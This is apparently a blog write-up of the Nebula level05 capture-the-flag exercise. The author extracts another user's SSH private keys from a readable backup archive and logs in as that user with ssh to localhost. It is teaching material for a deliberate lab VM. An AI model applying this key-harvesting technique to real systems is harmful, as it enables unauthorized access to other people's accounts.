So going forward to the [Nebula 05](http://exploit-exercises.com/nebula/level05), we now have to find some sort of weak permissions somewhere to escalate from level05 to flag05.  In searching through the flag05 home directory, I saw a ".backup" folder containing a copy of the user's old ssh keys. I extracted the archive to the level05 user's directory, so they could be used.

<!-- more -->

```
level05@nebula:/home/flag05$ cd .backup
level05@nebula:/home/flag05/.backup$ tar -xzvf backup-19072011.tgz -C /home/level05
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

Once that was setup, I simply tried to SSH back to the local machine but using the flag05 user, since I had their authentication keys.  Luckily it was secured *only* with keys, and not a password as well.  This let me right in.

```
level05@nebula:/home/flag05/.backup$ ssh flag05@localhost

Are you sure you want to continue connecting (yes/no)? yes

After getting in, I ran the "getflag" command, in case it does store the results somewhere.
